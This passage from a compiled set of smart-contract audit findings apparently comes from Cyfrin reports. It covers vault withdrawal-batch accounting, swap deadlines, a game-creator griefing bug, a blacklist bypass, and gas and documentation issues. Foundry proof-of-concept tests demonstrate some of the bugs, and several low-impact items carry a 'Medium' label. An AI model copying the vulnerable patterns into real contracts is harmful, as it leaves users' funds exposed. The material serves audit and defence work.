    usdcOpenTermVault.deposit(USDC_AMOUNT, charlie, charlie);

    vm.prank(borrower);
    usdcOpenTermLoan.borrow(USDC_AMOUNT * 3);

    // Batch 0: Alice + Bob queue withdrawals in the first interval.
    uint256 aliceB0 = USDC_AMOUNT / 2;
    uint256 bobB0 = USDC_AMOUNT / 3;
    vm.prank(alice);
    usdcOpenTermVault.requestRedeem(aliceB0, alice, alice);
    vm.prank(bob);
    usdcOpenTermVault.requestRedeem(bobB0, bob, bob);

    WithdrawalBatch memory b0Before = usdcOpenTermLoan.withdrawalBatches(0);
    assertEq(b0Before.totalShares, aliceB0 + bobB0, "batch0 tracks Alice+Bob");

    // Move to next interval -> Batch 1 is created by Charlie.
    vm.warp(block.timestamp + 7 days);
    uint256 charlieB1 = USDC_AMOUNT / 5;
    vm.prank(charlie);
    usdcOpenTermVault.requestRedeem(charlieB1, charlie, charlie);

    assertEq(usdcOpenTermLoan.currentBatch(), 1, "batch1 created");

    WithdrawalBatch memory b1Before = usdcOpenTermLoan.withdrawalBatches(1);
    assertEq(b1Before.totalShares, charlieB1, "batch1 tracks Charlie");

    // Charlie cancels. Strategy reduces starting from pendingBatch (0),
    // even though Charlie's request was created in batch 1.
    vm.prank(charlie);
    usdcOpenTermVault.cancelRedeemRequest(charlie, charlie);

    WithdrawalBatch memory b0AfterCancel = usdcOpenTermLoan.withdrawalBatches(0);
    WithdrawalBatch memory b1AfterCancel = usdcOpenTermLoan.withdrawalBatches(1);

    // NOTE: This shows the core accounting problem: batch0 shrinks (even though Alice+Bob are still queued),
    // and batch1 stays unchanged (even though Charlie is no longer queued).
    assertEq(
        b0AfterCancel.totalShares,
        (aliceB0 + bobB0) - charlieB1,
        "batch0 reduced by Charlie cancel (mis-attributed)"
    );
    assertEq(b1AfterCancel.totalShares, charlieB1, "batch1 unchanged (stale metadata)");

    // Queue now contains only Alice+Bob.
    assertEq(usdcOpenTermVault.totalQueuedShares(), aliceB0 + bobB0, "queue excludes cancelled Charlie");

    // We are already past batch0 expiry (4d) and before batch1 expiry (7d+4d).
    assertGe(block.timestamp, b0Before.expiry, "past batch0 expiry");
    assertLt(block.timestamp, b1Before.expiry, "before batch1 expiry");

    // Borrower repays enough liquidity to process ALL queued shares (Alice+Bob).
    // Due to understated batch0.totalShares, processing only does (alice+bob-charlie) shares and then stops at batch1.
    usdc.mint(borrower, USDC_AMOUNT * 3);
    vm.startPrank(borrower);
    usdc.approve(address(usdcOpenTermLoan), type(uint256).max);
    usdcOpenTermLoan.repay(USDC_AMOUNT * 3);
    vm.stopPrank();

    // Remaining queue shares == the "missing" amount (charlieB1), even though Charlie cancelled.
    // These are actually part of Alice/Bob's earlier requests that got pushed into the next batch window.
    assertEq(
        usdcOpenTermVault.totalQueuedShares(),
        charlieB1,
        "earlier requests rolled into next batch window (delayed until batch1 expiry)"
    );
    assertEq(usdcOpenTermLoan.pendingBatch(), 1, "pendingBatch advanced to batch1 and now blocks further processing");

    // Alice requested 500e11 shares and should be fully claimable:
    uint256 aliceClaimableShares = usdcOpenTermVault.maxRedeem(alice);
    assertEq(aliceClaimableShares, 500_000_000_000, "Alice fully claimable in batch0");

    // Bob requested 333333333333 shares, but only part of it was processed due to the bug.
    // From the trace: bob got RedeemClaimable(..., shares: 133333333333)
    uint256 bobClaimableShares = usdcOpenTermVault.maxRedeem(bob);
    assertEq(bobClaimableShares, 133_333_333_333, "Bob only partially claimable in batch0 (bug)");

    // The remainder should still be queued (333333333333 - 133333333333 = 200000000000)
    assertEq(usdcOpenTermVault.totalQueuedShares(), 200_000_000_000, "Remaining Bob shares still queued");

    // Demonstrate users can redeem what is currently claimable:
    vm.prank(alice);
    usdcOpenTermVault.redeem(aliceClaimableShares, alice, alice);

    vm.prank(bob);
    usdcOpenTermVault.redeem(bobClaimableShares, bob, bob);

    // After redeeming claimable amounts, queue should still contain Bob's remainder
    assertEq(usdcOpenTermVault.totalQueuedShares(), 200_000_000_000, "Bob remainder still queued after partial redeem");

    // Remaining shares can't become claimable until batch1 expires.
    // Warp past batch1 expiry and trigger processing again.
    WithdrawalBatch memory batch1 = usdcOpenTermLoan.withdrawalBatches(1);
    vm.warp(batch1.expiry + 1);
    usdcOpenTermLoan.processAvailableWithdrawals();

    // Now Bob's remainder should become claimable:
    uint256 bobClaimableAfter = usdcOpenTermVault.maxRedeem(bob);
    assertEq(bobClaimableAfter, 200_000_000_000, "Bob remainder becomes claimable only after batch1 expiry");

    // And Bob can finally redeem the rest:
    vm.prank(bob);
    usdcOpenTermVault.redeem(bobClaimableAfter, bob, bob);

    assertEq(usdcOpenTermVault.totalQueuedShares(), 0, "Queue fully drained after delayed processing");
}
```

**Recommended Mitigation:** Ensure cancellations decrement the correct batch. Track the batch id for each redeem request (or controller’s pending request) at queue time and subtract from that batch on cancel.

**Accountable:** Fixed in commit [`ec9ec5e`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/ec9ec5e489c4b02c4b5cee6debced79bcf7c3e3b)

**Cyfrin:** Verified. Cancellation now subtracts shares from the correct batch(es) via per-controller batch tracking.

## [M-30] In `p USDe Depositor::deposit_via Swap`, using `block.timestamp` in swap deadline is not very effective
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** [Using `block.timestamp` in a swap deadline](https://dacian.me/defi-slippage-attacks#heading-no-expiration-deadline) is not very effective since `block.timestamp` will be the block which the transaction gets put in, so the swap will never be able to expire in this way.

Instead the current `block.timestamp` should be retrieved off-chain and passed as input to the swap transaction.

**Strata:** Fixed in commit [2c43c07](https://github.com/Strata-Money/contracts/commit/2c43c07a839eb9d593c6bf67fc1b5c75b694aed7).

**Cyfrin:** Verified. Callers can now override the default swap deadline.

## [M-31] Cache identical storage reads and only write to storage once
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** Reading from storage is expensive; cache identical storage reads to prevent re-reading identical values from storage. Writing to storage is also expensive; increment cached values then write to storage only once when processing is complete:
* `DepositManager.sol`:
```solidity
// cache `pool.token` in `sponsorGame` saves 1 storage read
135:        emit GameSponsored(gameId, msg.sender, pool.token, amount);
136:        SafeERC20.safeTransferFrom(IERC20(pool.token), msg.sender, address(this), amount);

// cache `gamePools[gameId].token` in `_claimReferralReward` saves 1 storage read
142:        SafeERC20.safeTransfer(IERC20(gamePools[gameId].token), msg.sender, referralReward);
143:        emit ReferralRewardClaimed(gameId, msg.sender, gamePools[gameId].token, referralReward);

// cache `pool.token`, `pool.totalCollectedAmount * pool.creatorFee / BASIS_POINTS`,
// `pool.totalCollectedAmount * pool.protocolFee / BASIS_POINTS` in `_distributeFees`
// to save 6 storage reads
152:            pool.token,
154:            pool.totalCollectedAmount * pool.creatorFee / BASIS_POINTS,
156:            pool.totalCollectedAmount * pool.protocolFee / BASIS_POINTS
158:        SafeERC20.safeTransfer(IERC20(pool.token), creator, pool.totalCollectedAmount * pool.creatorFee / BASIS_POINTS);
160:           IERC20(pool.token), protocolTreasury, pool.totalCollectedAmount * pool.protocolFee / BASIS_POINTS

// cache `sponsorAmounts[sponsor][gameId]` before the `require` check
// in `_refundSponsorFunds` saves 1 storage read, caching `pool.token` afterwards
// also saves 1 storage read
165:        require(sponsorAmounts[sponsor][gameId] > 0, AlreadyRefunded(sponsor, gameId));
167:        uint256 amount = sponsorAmounts[sponsor][gameId];
170:        emit RefundSponsorFunds(gameId, sponsor, pool.token, amount);
171:        SafeERC20.safeTransfer(IERC20(pool.token), sponsor, amount);

// cache `pool.ticketPrice` in `_refundEntryFee` saves 2 storage reads
183:        require(pool.totalCollectedAmount >= pool.ticketPrice, NotEnoughFunds(pool.token, pool.totalCollectedAmount));
186:        SafeERC20.safeTransfer(IERC20(pool.token), player, pool.ticketPrice);
187:        pool.totalCollectedAmount -= pool.ticketPrice;

// cache `pool.token`, `pool.ticketPrice` in `_payEntryFee` saves 7 storage reads
193:            IERC20(pool.token).balanceOf(player) >= pool.ticketPrice,
196:                token: pool.token,
197:                balance: IERC20(pool.token).balanceOf(player),
198:                required: pool.ticketPrice
201:        SafeERC20.safeTransferFrom(IERC20(pool.token), player, address(this), pool.ticketPrice);
202:        pool.totalCollectedAmount += pool.ticketPrice;
203:        referralRewards[gameId][Registry(registry).referrers(player)] += pool.ticketPrice * REFERRER_FEE;
```

* `QuestionManager.sol`:
```solidity
// cache `nextQuestionId` to save 3 storage reads per loop iteration in `_commitQuestions`
// writing to storage is also expensive so ideally only want to write to storage once when updating
// nextQuestionId. Do it like this to be much more efficient:

// cache prior to loop
uint256 nextQuestionIdCache = nextQuestionId;

for (uint256 i; i < _questionHashes.length; i++) {
    require(_questionHashes[i] != bytes32(0), InvalidQuestionHash(_gameId, i));

    // use cached value to save identical storage reads
    require(
        questionCommitment[nextQuestionIdCache].promptHash == bytes32(0),
        QuestionAlreadyCommitted(_gameId, nextQuestionIdCache)
    );
    gameQuestions[_gameId].push(nextQuestionIdCache);
    questionCommitment[nextQuestionIdCache] =
        PromptInitData({promptHash: _questionHashes[i], promptStrategy: _promptStrategies[i]});
    emit QuestionCommitted(_gameId, nextQuestionIdCache, _questionHashes[i], _promptStrategies[i]);

    // increment cache at end of each loop iteration
    nextQuestionIdCache++;
}

// once loop finished, write to storage once
nextQuestionId = nextQuestionIdCache;
```

* `SessionManager.sol`:
```solidity
// cache `game.startTime` in `startAndRevealGameQuestion` saves ` storage read
402:        require(block.timestamp >= game.startTime, GameHasNotStartedYet(game.startTime, block.timestamp));
404:            block.timestamp <= game.startTime + revealGracePeriod,

// cache `questions.length` in `endGame` saves `questions.length - 1` storage reads
438:        for (uint256 i = 0; i < questions.length; i++) {

// cache `games[_gameId].state` in `cancelGame`, cancelGameIfCreatorMissing` saves 1 storage read
452:            games[_gameId].state != SessionState.Cancelled,
456:            games[_gameId].state != SessionState.Concluded,
465:            games[_gameId].state != SessionState.Cancelled,
469:            games[_gameId].state != SessionState.Concluded,
```

* `DefaultSession.sol`:
```solidity
// cache `assertion.winners.length` in `recordResults`
172:        for (uint256 i = 0; i < assertion.winners.length; ++i) {

// cache `assertion.totalXPs[i], assertion.totalTimes[i]` in `recordResults`
// also at L180 instead of `assertion.sessionId` can use input `sessionId` as they
// were asserted equal at L164
177:                    questionIds[j], winner, assertion.totalXPs[i], assertion.totalTimes[i]
181:                SessionResult({placement: i + 1, xp: assertion.totalXPs[i], time: assertion.totalTimes[i]});
```

* `MajorityChoicePrompt.sol`:
```solidity
// cache `revealedAt[_questionId]` in `commitReaction`
// same thing applies in `TriviaChoicePrompt` & `SPBinaryPrompt` `commitReaction` function
106:        require(revealedAt[_questionId] != 0, QuestionNotRevealed(_questionId));
112:            revealedAt[_questionId] + revealedQuestions[_questionId].reactionDeadline > block.timestamp,
```

**Majestic Games:**
Fixed in commit [4e56c11](https://github.com/Engage-Protocol/engage-protocol/commit/4e56c1123865865224b24583a6abadb4348fcc69).

**Cyfrin:** Verified.

## [M-32] Game creator can call `Trivia Choice Prompt::reveal Solutions` before the `reaction Deadline` or end of game, griefing players from submitting answers while still retaining player entry fees
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `TriviaChoicePrompt::revealSolutions` calls `_revealSolutions` which doesn't validate that `reactionDeadline` has expired. This causes `TriviaChoicePrompt::commitReaction` to revert when users try to submit answers:
```solidity
 function commitReaction(uint256 _gameId, uint256 _questionId, bytes32 _commit, address _user) external {
        require(revealedAt[_questionId] != 0, QuestionNotRevealed(_questionId));
        require(
            revealedQuestions[_questionId].sessionManager == msg.sender,
            OnlySessionManager(revealedQuestions[_questionId].sessionManager, msg.sender)
        );
        require(solutionRevealedAt[_questionId] == 0, SolutionAlreadyRevealed(_questionId)); <------
        require(
            revealedAt[_questionId] + revealedQuestions[_questionId].reactionDeadline > block.timestamp,
            ReactionDeadlinePassed(_user, _questionId)
        );
        Reaction storage r = reactions[_questionId][_user];
        require(r.baseReaction.timestamp == 0, AnswerAlreadyCommitted(_user, _gameId, _questionId));

        r.baseReaction.commit = _commit;
        r.baseReaction.timestamp = block.timestamp;

        emit AnswerCommitted(_gameId, _questionId, _user, _commit);
    }
```

**Impact:** A malicious game creator can immediately reveal solutions, preventing users from submitting answers and earning xp. The game creator can still keep the users' entry fees, griefing users.

**Proof of Concept:** Run this test in `test/prompt/TriviaChoicePropmt.t.sol`

```solidity
 function test_solution_as_soon_as_reveledQuestion() public {
        triviaChoice.setRevealedQuestions();
        triviaChoice.revealSolutions(
            1, Solarray.uint256s(1), Solarray.bytess(abi.encode(uint16(1))), Solarray.uint256s(1234)
        );

        vm.expectRevert(abi.encodeWithSelector(TriviaChoicePrompt.SolutionAlreadyRevealed.selector, 1));
        triviaChoice.commitReaction(1, 1, keccak256(abi.encode(uint16(1))), address(this));
    }
```

**Recommended Mitigation:** Don't allow the game creator to call `revealSolution` until the game has end; you can use the games mapping in the session manager  `require(sessionManager.games(_gameId).state = SessionState.Ended)`.

**Majority Games:**
Fixed in commit [4d3f8b5](https://github.com/Engage-Protocol/engage-protocol/commit/4d3f8b5be490bdba368d3d5e961ba3e678dcad9e).

**Cyfrin:** Verified. A different fix was chosen which is actually quite an elegant solution that removes the incentive for this the griefing attack because creators can't reveal solutions early without blocking their own ability to conclude the game, distribute rewards and claim their fees.

## [M-33] Use `uint32` for timestamps for better storage packing
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** The maximum value of `uint32` is 4294967295 which is 2106/02/07 - likely far longer than required by this protocol! Using `uint32` instead of `uint256` for timestamps and making sure those variables are adjacent to each-other can result in significantly reducing the amount of storage slots required:

* `SessionManager::Game::startTime, endTime, originalStartTime`
* `SessionManager::minimumStartDelay, maxGameDuration, revealGracePeriod, livenessDuration`
* `DefaultSession::SessionResult::time`

**Majority Games:**
Fixed in commit [5902894](https://github.com/Engage-Protocol/engage-protocol/commit/5902894a3c21e684298b639307ec950bc34be74b).

**Cyfrin:** Verified.

## [M-34] Return fast in `Compliance Service Regulated::check Hold Up` if platform wallet
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** `ComplianceServiceRegulated::checkHoldUp` should return fast if `_isPlatformWalletFrom == true`; there's no reason to do all the processing in that case:
```solidity
    function checkHoldUp(
        address[] memory _services,
        address _from,
        uint256 _value,
        bool _isUSLockPeriod,
        bool _isPlatformWalletFrom
    ) internal view returns (bool hasHoldUp) {
        // platform wallets have no lock period so return false (default)
        // and skip all processing if it is a platform wallet
        if(!_isPlatformWalletFrom) {
            ComplianceServiceRegulated complianceService
                = ComplianceServiceRegulated(_services[COMPLIANCE_SERVICE]);
            uint256 lockPeriod;
            if (_isUSLockPeriod) {
                lockPeriod = IDSComplianceConfigurationService(_services[COMPLIANCE_CONFIGURATION_SERVICE]).getUSLockPeriod();
            } else {
                lockPeriod = IDSComplianceConfigurationService(_services[COMPLIANCE_CONFIGURATION_SERVICE]).getNonUSLockPeriod();
            }

            hasHoldUp =
                complianceService.getComplianceTransferableTokens(
                    _from, block.timestamp, uint64(lockPeriod)) < _value;
        }
    }
```

**Securitize:** Fixed in commit [c407d0c](https://github.com/securitize-io/dstoken/commit/c407d0c5a7d702629db5a1fed1b65347078cea9d).

**Cyfrin:** Verified.

## [M-35] Missing signature deadline for `Global Registry Service::execute Pre Approved Transaction`
- Severity: `Medium`
- Source report: `registry.md`

### Detailed Content (from source)
**Description:** `GlobalRegistryService::executePreApprovedTransaction` allows an `Operator` to call an arbitrary contract and function, though the current intent is for it to call `addGlobalInvestorWallet`.

**Impact:** While `addGlobalInvestorWallet` implements a deadline using `block.number` (see other issue about using timestamp), if `executePreApprovedTransaction` is used to call other functions then no deadline check may be implemented or deadline checks will need to be duplicated in many other places.

**Recommended Mitigation:** Implement a timestamp-based deadline check in `GlobalRegistryService::executePreApprovedTransaction`. Also consider adding a way for admin or operators to increase `noncePerInvestor[txData.senderInvestor]` so that nonces can be invalidated.

**Securitize:** Fixed in commits [8f92757](https://github.com/securitize-io/bc-global-registry-service-sc/commit/8f927571c7526817ffe43c5f37d11560e79809d9), [e99c56f](https://github.com/securitize-io/bc-global-registry-service-sc/commit/e99c56fe94f9b41e0680d2318f504fca33be4919), [920e496](https://github.com/securitize-io/bc-global-registry-service-sc/commit/920e4965bb9306203a8251e58c962f4dfff67a3f)

**Cyfrin:** Verified.

\clearpage

## [M-36] Mismatching variable naming for `Metadata.deposit Block`
- Severity: `Medium`
- Source report: `stbl.md`

### Detailed Content (from source)
**Description:** Based on [the inline doc ](https://github.com/USD-Pi-Protocol/contract/blob/main/contracts/lib/STBL_Structs.sol#L26-L27)of `Metadata.depositBlock` implies it saves the block number when the deposit was created, but in reality, this variable [saves the timestamp.](https://github.com/USD-Pi-Protocol/contract/blob/main/contracts/Assets/LT1/STBL_LT1_Issuer.sol#L351)


**Recommended Mitigation:** Consider renaming the variable `Metadata.depositBlock` to a more accurate name, i.e., `Metadata.depositTimestamp`

**STBL:** Fixed in commit [c540943](https://github.com/USD-Pi-Protocol/contract/commit/c54094363b196b534c9c36d563851dff31fe2975).

**Cyfrin:** Verified.

## [M-37] Blacklisted users can claim withdrawn assets after the cooldown period
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** `StakingVault::_update` uses modifiers `notBlacklisted(from) notBlacklisted(to)` to prevent blacklisted users from performing most actions.

But `StakingVault::claimWithdraw` does not use the `notBlacklisted` modifier. Hence a user who has been blacklisted after they first withdrew/redeemed can still claim those assets once the cooldown period has expired.

**Recommended Mitigation:** `StakingVault::claimWithdraw` should have at least `notBlacklisted(msg.sender)` and possibly also `notBlacklisted(receiver)`, though the second one is less effective since the user can input an arbitrary address.

**Syntetika:**
Fixed in commit [d98afbf](https://github.com/SyntetikaLabs/monorepo/commit/d98afbfd76670a0cbebfb3399f167481344f689d).

**Cyfrin:** Verified.

## [M-39] Emit missing event information
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** Emit missing event information:
* `YieldDistributed` should have the `timestamp` parameter in addition to the amount

**Syntetika:**
Fixed in commit [f4305a6](https://github.com/SyntetikaLabs/monorepo/commit/f4305a630d731455477a9979a9bb9bbdba541f00).

**Cyfrin:** Verified.

## [M-40] Cooldown contracts underreport the real balance of users because they only consider the balance of requests whose cooldown period is over
- Severity: `Medium`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** Cooldown contracts underreport the real balance of users because not all active requests are accounted for; only those requests whose cooldown period has expired are considered part of a user's balance.

This implementation doesn't accurately show the actual information about the user's balance at all times, only until requests are finalized (cooldown period is over).

**Recommended Mitigation:** Consider refactoring the `balanceOf()` method to return all balances, including both available and locked balances.

**Strata:**
Fixed in commit [949cb4](https://github.com/Strata-Money/contracts-tranches/commit/949cb474579036655fc3da066d8c35e77443ffd4) and [1f82c6](https://github.com/Strata-Money/contracts-tranches/commit/1f82c6a456272fd40afcb8792b7b4b3d9c13da20) to return more detailed data about the active requests, such as `pending` and `claimable` amounts, based on the lock periods.

**Cyfrin:** Verified.

## [M-41] Nat Spec enhancements
- Severity: `Medium`
- Source report: `vesting.md`

### Detailed Content (from source)
**Description:** * [`SDLVesting#L11`](https://github.com/stakedotlink/contracts/blob/3462c0d04ff92a23843adf0be8ea969b91b9bf0c/contracts/vesting/SDLVesting.sol#L11): `beneficary` should be `beneficiary`
* [`SDLVesting::onlyBeneficiary#L90`](https://github.com/stakedotlink/contracts/blob/3462c0d04ff92a23843adf0be8ea969b91b9bf0c/contracts/vesting/SDLVesting.sol#L90): extra space in `not  beneficiary`
* [`SDLVesting::setLockTime#L187`](https://github.com/stakedotlink/contracts/blob/3462c0d04ff92a23843adf0be8ea969b91b9bf0c/contracts/vesting/SDLVesting.sol#L187): `_lockTime lock time in seconds` should be `_lockTime lock time in years`
* [`SDLVesting::vestedAmount`](https://github.com/stakedotlink/contracts/blob/3462c0d04ff92a23843adf0be8ea969b91b9bf0c/contracts/vesting/SDLVesting.sol#L195-L198): Doesn't document the return: `@return amount of tokens vested at the given timestamp. Returns full allocation if terminated.`

**Stake.Link:** Fixed in commits [`e458512`](https://github.com/stakedotlink/contracts/commit/e4585124c05137848196d4ca759c3e9d28b963e1) and [`565b043`](https://github.com/stakedotlink/contracts/commit/565b043b98f6b0a61a9eda9b7f2ca20ecdac8598)

**Cyfrin:** Verified.

\clearpage
## Gas Optimization

## [M-42] Extra data should only be decoded when its length is exactly 96 bytes
- Severity: `Medium`
- Source report: `vii.md`

### Detailed Content (from source)
**Description:** When decreasing liquidity, both `UniswapV3Wrapper` and `UniswapV4Wrapper` assume that it will be possible to decode extra data if is has a non-zero length:

```solidity
// UniswapV3Wrapper usage
(uint256 amount0Min, uint256 amount1Min, uint256 deadline) =
        extraData.length > 0 ? abi.decode(extraData, (uint256, uint256, uint256)) : (0, 0, block.timestamp);

// UniswapV4Wrapper usage
(uint128 amount0Min, uint128 amount1Min, uint256 deadline) = _decodeExtraData(extraData);

function _decodeExtraData(bytes calldata extraData)
    internal
    view
    returns (uint128 amount0Min, uint128 amount1Min, uint256 deadline)
{
    if (extraData.length > 0) {
        (amount0Min, amount1Min, deadline) = abi.decode(extraData, (uint128, uint128, uint256));
    } else {
        (amount0Min, amount1Min, deadline) = (0, 0, block.timestamp);
    }
}
```

However, this is not strictly true since execution of partial unwrap will revert if the length is less than the expected 96 bytes. While there is no impact to decoding bytes of the incorrect length in this case, a fallback to the default values may be preferable over reverting.

**Impact:** Malformed extra data will cause partial unwraps to revert.

**Recommended Mitigation:** Consider decoding extra data only when its length is exactly 96 bytes.

**VII Finance:** Fixed in commit [79741ea](https://github.com/kankodu/vii-finance-smart-contracts/commit/79741eae2590c57902f1c7c5361d878b3023202d).

**Cyfrin:** Verified. The stricter `extraData` length check has been added to ensure correct decoding.

## [M-43] Remove redundant timestamp check in `Bet::resolve`
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** `Bet::resolve` has this revert check:
```solidity
// Make sure the bet is active
if (_status(b) != IBet.Status.ACTIVE || block.timestamp > b.resolveBy) {
    revert InvalidStatus();
}
```

But the call to `_status(b)` already checks `block.timestamp > b.resolveBy` and returns `EXPIRED` status which triggers the revert, so having the same timestamp check here again is redundant.

**WannaBet:** Fixed in commit [45afa44](https://github.com/gskril/wannabet-v2/commit/45afa44a0adf423a2c2775c22d9f99e0ce555bbc).

**Cyfrin:** Verified.

\clearpage

## [M-44] Lack of event emissions on important state changes
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** The following functions change state but doesn't emit an event. Consider emitting an event from the following:


- [`Access::setAdministrator`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/administrator/Access.sol#L76)
- [`Administrator::cancelAdminRole`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/administrator/Administrator.sol#L109)
- [`Administrator::cancelTimeLockUpdate`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/administrator/Administrator.sol#L148)
- [`Bridge::setMIN_RECEIVER_GAS`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L52)
- [`BridgeMB::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/BridgeMB.sol#L42)
- [`BridgeCCIP::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L82)
- [`Manager::setTreasury`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L52)
- [`Manager::setReceipt`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L61)
- [`Manager::setCustodyWallet`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L71)
- [`Manager::setMinSharesInYToken`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L81)
- [`OracleAdapter::setStaleThreshold`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/OracleAdapter.sol#L48)
- [`LockBox::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/LockBox.sol#L31)
- [`YToken::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L42)
- [`YToken::setYield`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L47)
- [`YToken::setVestingPeriod`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L52)
- [`YToken::setFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L62)
- [`YToken::setGasFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L72)
- [`YToken::updateTotalAssets`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L179)
- [`YTokenL2::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L83)
- [`YTokenL2::setFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L92)
- [`YTokenL2::setGasFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L102)


**YieldFi:** Fixed in commit [`b978ddf`](https://github.com/YieldFiLabs/contracts/commit/b978ddfc6ba8299a6045fde5e065f5fc276c02f7)

**Cyfrin:** Verified.

## [M-45] Missing vesting check in `Perpetual Bond::set Vesting Period`
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** Both `YToken` and `PerpetualBond` support reward vesting through a configurable vesting period. The admin can update this period via the `setVestingPeriod` function. However, there is an inconsistency in how the two contracts validate changes to the vesting period:

- [`YToken::setVestingPeriod`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L52-L56) includes a check to ensure that no rewards are currently vesting:
  ```solidity
  function setVestingPeriod(uint256 _vestingPeriod) external onlyAdmin {
      require(getUnvestedAmount() == 0, "!vesting");
      require(_vestingPeriod > 0, "!vestingPeriod");
      vestingPeriod = _vestingPeriod;
  }
  ```

- [`PerpetualBond::setVestingPeriod`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L184-L188) lacks this check:
  ```solidity
  function setVestingPeriod(uint256 _vestingPeriod) external onlyAdmin {
      // @audit-issue no check for `getUnvestedAmount() == 0`
      require(_vestingPeriod > 0, "!vestingPeriod");
      vestingPeriod = _vestingPeriod;
      emit VestingPeriodUpdated(_vestingPeriod);
  }
  ```

This means the vesting period in `PerpetualBond` can be modified even while tokens are still vesting, which could lead to inconsistent or unexpected vesting behavior.

**Recommended Mitigation:** To align with the `YToken` implementation and ensure consistency, add a check in `PerpetualBond::setVestingPeriod` to ensure `getUnvestedAmount() == 0` before allowing updates to the vesting period.

**YieldFi:** Fixed in commit [`f0bf88c`](https://github.com/YieldFiLabs/contracts/commit/f0bf88cb51a92a119cdde896c4b0118be1d1a031)

**Cyfrin:** Verified. `unvestedAmount` is now checked.

## [M-46] Order not eligible at `eligible At`
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** Both in [`PerpetualBond::executeOrder`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L411) and [`Manager::executeOrder`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L208) there's a check that the order executed is still eligible:
```solidity
require(block.timestamp > order.eligibleAt, "!waitingPeriod");
```
`eligibleAt` indicates that the order should be eligible at this timestamp which is not what the check verifies. Consider changing `>` to `>=`:
```diff
- require(block.timestamp > order.eligibleAt, "!waitingPeriod");
+ require(block.timestamp >= order.eligibleAt, "!waitingPeriod");
```

**YieldFi:** Fixed in commit [`e9c160f`](https://github.com/YieldFiLabs/contracts/commit/e9c160fdfd6dd90650c9537fba73c17cb3c53ea5)

**Cyfrin:** Verified.

## [M-47] Order read twice in `Manager::execute Order`
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** In [`Manager::executeOrder`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L207-L214) the order data is fetched from the Receipt:
```solidity
Order memory order = IReceipt(receipt).readOrder(_receiptId);
require(block.timestamp > order.eligibleAt, "!waitingPeriod");
require(_fee <= Constants.ONE_PERCENT, "!fee");
if (order.orderType) {
    _deposit(msg.sender, _receiptId, _amount, _fee, _gas);
} else {
